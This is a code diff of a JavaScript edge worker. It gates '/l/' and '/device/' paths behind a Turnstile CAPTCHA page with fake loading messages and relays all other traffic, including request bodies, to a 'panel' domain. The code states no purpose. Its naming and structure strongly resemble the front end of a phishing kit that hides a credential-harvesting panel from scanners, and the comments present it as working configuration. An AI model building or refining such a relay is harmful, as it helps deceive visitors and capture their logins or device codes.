@@ -4,9 +4,9 @@ export default {
     const path = url.pathname;
     const search = url.search;
 
-    // === CONFIGURATION ===
+    // === CONFIGURATION (change if needed) ===
     const PANEL = 'portal42-343.sbs';
-    const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
+    const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm'; // your working site key
 
     // === CAPTCHA PAGE ===
     if (path === '/captcha') {
@@ -17,20 +17,24 @@ export default {
       });
     }
 
-    // === PROTECTED PATHS (redirect to CAPTCHA) ===
+    // === PROTECTED PATHS (show CAPTCHA) ===
     if (path.startsWith('/l/') || path.startsWith('/device/')) {
       const returnUrl = path + search;
       return Response.redirect(`/captcha?return=${encodeURIComponent(returnUrl)}`, 302);
     }
 
-    // === PROXY EVERYTHING ELSE ===
+    // === PROXY EVERYTHING ELSE (root, static, etc.) ===
     const target = `https://${PANEL}${path}`;
     const headers = new Headers(request.headers);
     headers.set('Host', PANEL);
     const body = request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined;
 
     try {
-      const response = await fetch(target, { method: request.method, headers, body });
+      const response = await fetch(target, {
+        method: request.method,
+        headers,
+        body,
+      });
       const newResponse = new Response(response.body, {
         status: response.status,
         statusText: response.statusText,
@@ -81,6 +85,7 @@ function getCaptchaHTML(siteKey, returnPath) {
     const returnPath = "${returnPath}";
     const msgs = ["Loading...", "Processing...", "Almost there...", "Finalizing..."];
     let idx = 0;
+    document.getElementById('dp').textContent = msgs[0];
     setInterval(() => { document.getElementById('dp').textContent = msgs[idx]; idx = (idx+1)%msgs.length; }, 3000);
     function turnstileCallback(token) { if (token) window.location.href = returnPath; }
     function turnstileErrorCallback() { document.getElementById('status').textContent = 'Error. Please refresh.'; document.getElementById('status').style.display = 'block'; }
